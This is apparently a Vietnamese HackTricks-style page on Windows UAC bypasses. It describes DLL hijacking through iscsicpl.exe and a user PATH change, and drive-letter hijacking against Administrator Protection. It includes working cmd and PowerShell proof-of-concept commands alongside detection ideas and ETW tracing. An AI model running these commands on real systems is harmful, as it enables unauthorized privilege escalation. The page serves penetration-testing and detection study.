### UAC bypass qua `SysWOW64\iscsicpl.exe` + user `PATH` DLL hijack

`C:\Windows\SysWOW64\iscsicpl.exe` 32-bit là một binary **auto-elevated** có thể bị khai thác để load `iscsiexe.dll` theo thứ tự tìm kiếm. Nếu bạn có thể đặt một `iscsiexe.dll` độc hại trong thư mục **user-writable**, rồi sửa `PATH` của user hiện tại (ví dụ qua `HKCU\Environment\Path`) để thư mục đó được tìm kiếm, Windows có thể load DLL của attacker vào process `iscsicpl.exe` đã elevated **mà không hiển thị lời nhắc UAC**.<sup>[[1]](#references)[[6]](#references)</sup>

Ghi chú thực tế:
- Cách này hữu ích khi user hiện tại thuộc nhóm **Administrators** nhưng đang chạy ở mức **Medium Integrity** do UAC.
- Bản **SysWOW64** là bản cần dùng cho bypass này. Hãy xem bản **System32** là một binary riêng và xác minh hành vi của nó một cách độc lập.
- Primitive này kết hợp **auto-elevation** và **DLL search-order hijacking**, vì vậy quy trình ProcMon tương tự các UAC bypass khác rất hữu ích để xác minh việc load DLL bị thiếu.

Luồng tối giản:

```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```

Ý tưởng phát hiện:
- Cảnh báo khi có `reg add` / thao tác ghi registry vào `HKCU\Environment\Path`, ngay sau đó là thực thi `C:\Windows\SysWOW64\iscsicpl.exe`.
- Tìm `iscsiexe.dll` ở các vị trí **do người dùng kiểm soát**, chẳng hạn `%TEMP%` hoặc `%LOCALAPPDATA%\Microsoft\WindowsApps`.
- Tương quan các lần khởi chạy `iscsicpl.exe` với tiến trình con bất thường hoặc việc tải DLL từ bên ngoài các thư mục Windows thông thường.

### Nghiên cứu mới hơn cần kiểm tra riêng

Một số chuỗi khai thác sau năm 2024 không còn giống các vụ chiếm quyền registry `HKCU\Software\Classes` kiểu cổ điển. Ví dụ, có thể kết hợp đầu độc cache activation-context với **drive remap** và **DLL redirection** để chuyển từ mức toàn vẹn trung bình lên cao thông qua UI đáng tin cậy / các binary tự động nâng quyền như `ctfmon.exe`, rồi nhắm đến các mục tiêu như `fodhelper.exe`. Thay vì lặp lại PoC lớn ở đây, hãy xem các ví dụ payload ngắn gọn trong:

{{#ref}}
../windows-local-privilege-escalation/windows-c-payloads.md
{{#endref}}

### Chiếm quyền ký tự ổ đĩa qua bản đồ thiết bị DOS theo phiên đăng nhập (bản xem trước Administrator Protection)

> [!NOTE]
> Tính đến tháng 8 năm 2026, Microsoft vẫn ghi nhận Administrator Protection là **bản xem trước dành cho Insider**: đợt triển khai tháng 10 năm 2025 đã bị đảo ngược và được lên kế hoạch phát hành vào thời điểm sau này. Trước khi kiểm thử các chuỗi khai thác này, hãy xác nhận **Admin Approval Mode with Administrator protection** thực sự được bật và thiết bị đã khởi động lại; chỉ riêng chuỗi phiên bản 25H2 mặc định không chứng minh tính năng đang hoạt động.<sup>[[10]](#references)</sup>

Để biết toàn bộ bề mặt tấn công `RAiLaunchAdminProcess` / UIAccess trên các bản dựng xem trước Windows 11 25H2, hãy xem trang chuyên biệt:

{{#ref}}
../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
{{#endref}}

Windows 11 25H2 “Administrator Protection” sử dụng token shadow-admin với các bản đồ `\Sessions\0\DosDevices/<LUID>` riêng theo từng phiên. Thư mục này được `SeGetTokenDeviceMap` tạo theo yêu cầu trong lần phân giải `\??` đầu tiên. Nếu kẻ tấn công mạo danh token shadow-admin ở mức **SecurityIdentification**, thư mục sẽ được tạo với kẻ tấn công là **chủ sở hữu** (kế thừa `CREATOR OWNER`), cho phép các liên kết ký tự ổ đĩa được ưu tiên hơn `\GLOBAL??`.<sup>[[7]](#references)</sup>

**Các bước:**

1. Từ một phiên có đặc quyền thấp, gọi `RAiProcessRunOnce` để khởi chạy `runonce.exe` shadow-admin không hiện lời nhắc.
2. Sao chép token chính của tiến trình thành token **identification** rồi mạo danh token đó khi mở `\??` để buộc tạo `\Sessions\0\DosDevices/<LUID>` dưới quyền sở hữu của kẻ tấn công.
3. Tạo một symlink `C:` tại đó trỏ đến vùng lưu trữ do kẻ tấn công kiểm soát; các lần truy cập hệ thống tệp tiếp theo trong phiên đó sẽ phân giải `C:` thành đường dẫn của kẻ tấn công, cho phép chiếm quyền DLL/tệp mà không cần lời nhắc.

**PoC PowerShell (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```

Trên các máy chủ preview, Administrator Protection ghi lại các lần phê duyệt và thất bại dưới dạng sự kiện ETW **15031** và **15032** trong provider `Microsoft-Windows-LUA`. Các sự kiện này bao gồm SID của bên yêu cầu, đường dẫn ứng dụng, kết quả, tài khoản quản trị viên được quản lý và phương thức xác thực, vì vậy các lần thử exploit lặp lại hoặc điều khiển giao diện người dùng thất bại đều được ghi nhận qua telemetry.<sup>[[10]](#references)</sup>

```cmd
logman start AdminProtectionTrace -p {93c05d69-51a3-485e-877f-1806a8731346} -ets
rem reproduce the elevation attempt
logman stop AdminProtectionTrace -ets
```



## References

- [1] [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [2] [Microsoft Docs – Cách hoạt động của User Account Control](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [3] [UACME – Bộ sưu tập kỹ thuật bypass UAC](https://github.com/hfiref0x/UACME)
- [4] [WinPwnage – Công cụ quét khả năng tương thích và khởi chạy UAC bypass](https://github.com/rootm0s/WinPwnage)
- [5] [Checkpoint Research – KONNI sử dụng AI để tạo backdoor PowerShell](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [6] [Check Point Research – Chiến dịch TrueChaos: Khai thác 0-Day nhắm vào các mục tiêu chính phủ Đông Nam Á](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [7] [Project Zero – Bypass Windows Administrator Protection](https://projectzero.google/2026/26/windows-administrator-protection.html)
- [8] [Sigma / Detection.FYI – Bypass UAC bằng tác vụ SilentCleanup](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)
- [9] [R41N3RZUF477 – Các bypass UnifiedConsent, TabTip và Narrator Always Notify](https://github.com/hfiref0x/UACME/issues/173)
- [10] [Microsoft Learn – Bảo vệ quản trị viên](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/administrator-protection/)
- [11] [Google Project Zero – Gọi các máy chủ RPC Windows cục bộ từ .NET](https://projectzero.google/2019/12/calling-local-windows-rpc-servers-from.html)
- [12] [Kaspersky Securelist – HoneyMyte nâng cấp CoolClient bằng rootkit kernel Windows có chữ ký số](https://securelist.com/honeymyte-coolclient-driver-rootkit/121028)
- [13] [Group-IB – KGB RAT: Trojan Windows hoàn toàn không thể bị phát hiện, được tạo ra để do thám, đánh cắp và khủng bố](https://www.group-ib.com/blog/kgb-rat-windows-fud-trojan/)
- [14] [LOLBAS – ComputerDefaults.exe](https://lolbas-project.github.io/lolbas/Binaries/ComputerDefaults/)
{{#include ../../banners/hacktricks-training.md}}
